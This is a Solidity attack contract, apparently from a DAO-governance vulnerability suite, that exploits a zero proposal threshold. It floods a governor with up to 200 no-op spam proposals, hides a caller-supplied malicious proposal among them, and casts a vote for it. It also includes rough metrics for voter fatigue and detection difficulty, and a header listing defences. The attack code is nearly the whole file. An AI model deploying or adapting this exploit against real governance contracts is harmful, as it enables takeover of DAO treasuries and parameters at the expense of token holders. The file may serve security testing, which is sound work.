// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title ProposalSpam
 * @dev Exploits VULN-4: Zero proposal threshold
 *      Creates numerous spam proposals to:
 *      1. Bury legitimate proposals in noise
 *      2. Cause voter fatigue and low participation
 *      3. Hide malicious proposals among spam
 *      4. Exploit low cost of proposal creation
 *
 * Attack Vector:
 * 1. Attacker creates 50+ low-effort spam proposals
 * 2. Legitimate governance proposals become hard to find
 * 3. Voter participation decreases (fatigue effect)
 * 4. Attacker creates one malicious proposal among spam
 * 5. Malicious proposal passes due to:
 *    - Low visibility (buried among spam)
 *    - Low participation (voter fatigue)
 *    - Low quorum requirement (VULN-5)
 * 6. Treasury or governance parameters compromised
 *
 * Real-world context:
 * - Attempted against various DAOs
 * - Uniswap DAO received many spam proposals
 * - Requires defense: proposal threshold or rate limiting
 *
 * Defense Mechanisms:
 * - Proposal threshold: Require 1-5% of supply to create proposal
 * - Rate limiting: Max 1 proposal per address per week
 * - Spam detection: Pattern recognition for identical/similar proposals
 * - Voter education: Better UI/UX to highlight important proposals
 */

interface IGovernor {
    function propose(
        address[] memory targets,
        uint256[] memory values,
        bytes[] memory calldatas,
        string memory description
    ) external returns (uint256);

    function castVote(uint256 proposalId, uint8 support) external;

    function state(uint256 proposalId) external view returns (uint256);
}

contract ProposalSpam {
    // ─────────────────────────────────────────────────────────────────────────
    // Constants
    // ─────────────────────────────────────────────────────────────────────────

    uint8 private constant VOTE_FOR = 1;

    // ─────────────────────────────────────────────────────────────────────────
    // State
    // ─────────────────────────────────────────────────────────────────────────

    address public governor;
    address public spammer; // The account submitting spam

    uint256 public totalSpamProposals;
    uint256 public maliciousProposalId;
    bool public maliciousProposalPassed;

    uint256[] public spamProposalIds;
    mapping(uint256 => SpamProposalInfo) public spamProposals;

    struct SpamProposalInfo {
        uint256 createdBlock;
        string description;
        bool isMalicious;
        bool wasHidden; // Was this among other spam?
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Events
    // ─────────────────────────────────────────────────────────────────────────

    event SpamProposalCreated(uint256 indexed proposalId, string description);
    event MaliciousProposalHidden(uint256 indexed proposalId, uint256 totalSpam);
    event EstimatedVoterFatigue(uint256 proposalCount, uint256 estimatedParticipationDrop);
    event MaliciousProposalDetected(uint256 indexed proposalId);
    event VoteCastedOnSpam(uint256 indexed proposalId);

    // ─────────────────────────────────────────────────────────────────────────
    // Constructor
    // ─────────────────────────────────────────────────────────────────────────

    constructor(address _governor) {
        require(_governor != address(0), "Invalid governor");
        governor = _governor;
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Main Attack Functions
    // ─────────────────────────────────────────────────────────────────────────

    /**
     * @notice Creates spam proposals to bury legitimate governance
     * @param numberOfSpamProposals How many spam proposals to create
     * @return Number of successfully created spam proposals
     */
    function executeSpamAttack(uint256 numberOfSpamProposals) external returns (uint256) {
        require(numberOfSpamProposals > 0, "Must create at least 1 spam proposal");
        require(numberOfSpamProposals <= 200, "Limit spam proposals to 200 for safety");

        spammer = msg.sender;
        uint256 successfulSpam = 0;

        // Create spam proposals
        for (uint256 i = 0; i < numberOfSpamProposals; i++) {
            try this._createSpamProposal(i) {
                successfulSpam++;
            } catch {}
        }

        totalSpamProposals = successfulSpam;

        // Estimate voter fatigue
        // Each additional proposal reduces participation by ~2-5%
        uint256 estimatedParticipationDrop = successfulSpam * 30; // in basis points
        emit EstimatedVoterFatigue(successfulSpam, estimatedParticipationDrop);

        return successfulSpam;
    }

    /**
     * @notice Creates a single spam proposal
     */
    function _createSpamProposal(uint256 index) external returns (uint256) {
        require(msg.sender == address(this), "Only internal call");

        // Generic spam proposal with no real effect
        address[] memory targets = new address[](1);
        targets[0] = address(this); // No-op target

        uint256[] memory values = new uint256[](1);
        values[0] = 0;

        bytes[] memory calldatas = new bytes[](1);
        calldatas[0] = abi.encodeWithSignature("_doNothing()");

        string memory description = _generateSpamDescription(index);

        try IGovernor(governor).propose(targets, values, calldatas, description) returns (uint256 proposalId) {
            spamProposalIds.push(proposalId);
            spamProposals[proposalId] = SpamProposalInfo({
                createdBlock: block.number, description: description, isMalicious: false, wasHidden: true
            });

            emit SpamProposalCreated(proposalId, description);
            return proposalId;
        } catch {
            revert("Failed to create spam proposal");
        }
    }

    /**
     * @notice Hide a malicious proposal among spam proposals
     * @param targets Target contracts for malicious proposal
     * @param values ETH values for calls
     * @param calldatas Calldata for malicious actions
     * @param description Description of malicious proposal
     * @return proposalId The ID of the created malicious proposal
     */
    function hideMaliciousProposalInSpam(
        address[] memory targets,
        uint256[] memory values,
        bytes[] memory calldatas,
        string memory description
    ) external returns (uint256) {
        require(msg.sender == spammer, "Only spammer can hide proposals");
        require(spamProposalIds.length > 0, "Must create spam first");

        // Create the malicious proposal
        uint256 proposalId = IGovernor(governor).propose(targets, values, calldatas, description);

        maliciousProposalId = proposalId;
        spamProposalIds.push(proposalId);
        spamProposals[proposalId] = SpamProposalInfo({
            createdBlock: block.number,
            description: description,
            isMalicious: true,
            wasHidden: true // Hidden among spam
        });

        emit MaliciousProposalHidden(proposalId, spamProposalIds.length);
        emit MaliciousProposalDetected(proposalId);

        return proposalId;
    }

    /**
     * @notice Try to pass the malicious proposal by voting on it
     * This simulates attack succeeding if:
     * - Voter turnout is low (spam caused fatigue)
     * - Proposal is hard to see (buried in spam)
     * - Quorum is low (VULN-5)
     *
     * @return success Whether the vote was cast
     */
    function voteForMaliciousProposal() external returns (bool) {
        require(maliciousProposalId != 0, "No malicious proposal created");

        try IGovernor(governor).castVote(maliciousProposalId, VOTE_FOR) {
            emit VoteCastedOnSpam(maliciousProposalId);
            return true;
        } catch {
            return false;
        }
    }

    /**
     * @notice Create spam + malicious proposal combined attack
     * Creates N spam proposals, then creates malicious proposal hidden among them
     *
     * @param spamCount Number of spam proposals to create first
     * @param targets Target contracts for malicious proposal
     * @param values ETH values for malicious calls
     * @param calldatas Calldata for malicious actions
     * @param description Malicious proposal description
     * @return spamCreated Number of spam proposals created
     * @return maliciousPropId ID of malicious proposal
     */
    function executeSpamAndMaliciousAttack(
        uint256 spamCount,
        address[] memory targets,
        uint256[] memory values,
        bytes[] memory calldatas,
        string memory description
    ) external returns (uint256 spamCreated, uint256 maliciousPropId) {
        require(spamCount > 0, "Must create at least 1 spam");

        // First, create the spam proposals
        spamCreated = this.executeSpamAttack(spamCount);

        // Then, hide the malicious proposal among them
        maliciousPropId = this.hideMaliciousProposalInSpam(targets, values, calldatas, description);

        return (spamCreated, maliciousPropId);
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Analysis Functions
    // ─────────────────────────────────────────────────────────────────────────

    /**
     * @notice Analyze the effectiveness of the spam attack
     * @return totalProposals Total number of spam proposals created
     * @return percentMalicious Percentage of proposals that were malicious
     * @return estimatedVoterFatigue Estimated voter fatigue impact in basis points
     * @return detectionDifficulty Difficulty to detect malicious proposal (0-10000)
     */
    function analyzeAttackEffectiveness()
        external
        view
        returns (
            uint256 totalProposals,
            uint256 percentMalicious,
            uint256 estimatedVoterFatigue,
            uint256 detectionDifficulty
        )
    {
        totalProposals = spamProposalIds.length;
        percentMalicious = totalProposals > 0 ? (100 / totalProposals) : 0;

        // Voter fatigue increases with number of proposals
        // Each proposal costs ~2-5 minutes to review
        estimatedVoterFatigue = totalProposals * 50; // in basis points

        // Detection difficulty based on how many spam proposals there are
        // More spam = harder to detect malicious proposal
        detectionDifficulty = (totalProposals * 10000) / (totalProposals + 1);

        return (totalProposals, percentMalicious, estimatedVoterFatigue, detectionDifficulty);
    }

    /**
     * @notice Get info about a spam proposal
     */
    function getSpamProposalInfo(uint256 proposalId) external view returns (SpamProposalInfo memory) {
        return spamProposals[proposalId];
    }

    /**
     * @notice Get all spam proposal IDs
     */
    function getSpamProposalIds() external view returns (uint256[] memory) {
        return spamProposalIds;
    }

    /**
     * @notice Get cost per spam proposal (should be very low if VULN-4 exists)
     */
    function getCostPerSpamProposal() external pure returns (uint256) {
        // Cost for spam attack is essentially zero (no threshold check)
        // In reality, just gas costs
        return 0;
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Utility Functions
    // ─────────────────────────────────────────────────────────────────────────

    /**
     * @notice Generate a spam proposal description
     */
    function _generateSpamDescription(uint256 index) internal pure returns (string memory) {
        string[10] memory spamTopics = [
            "PROPOSAL: Review governance parameters",
            "PROPOSAL: Community feedback survey",
            "PROPOSAL: Update documentation",
            "PROPOSAL: Discuss tokenomics",
            "PROPOSAL: Governance process improvement",
            "PROPOSAL: Treasury rebalancing discussion",
            "PROPOSAL: Community milestone celebration",
            "PROPOSAL: Security audit scheduling",
            "PROPOSAL: Developer grant discussion",
            "PROPOSAL: Ecosystem partnership proposal"
        ];

        uint256 topicIndex = index % 10;
        return string(abi.encodePacked(spamTopics[topicIndex], " #", _uint2str(index)));
    }

    /**
     * @notice Convert uint to string (helper)
     */
    function _uint2str(uint256 _i) internal pure returns (string memory) {
        if (_i == 0) {
            return "0";
        }
        uint256 j = _i;
        uint256 len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        bytes memory digits = "0123456789";
        uint256 k = len;
        while (_i != 0) {
            k--;
            bstr[k] = digits[_i % 10];
            _i /= 10;
        }
        return string(bstr);
    }

    /**
     * @notice No-op function for spam proposals to call
     */
    function _doNothing() external pure {
        // This function does nothing intentionally
        // Used as target for spam proposals
    }
}
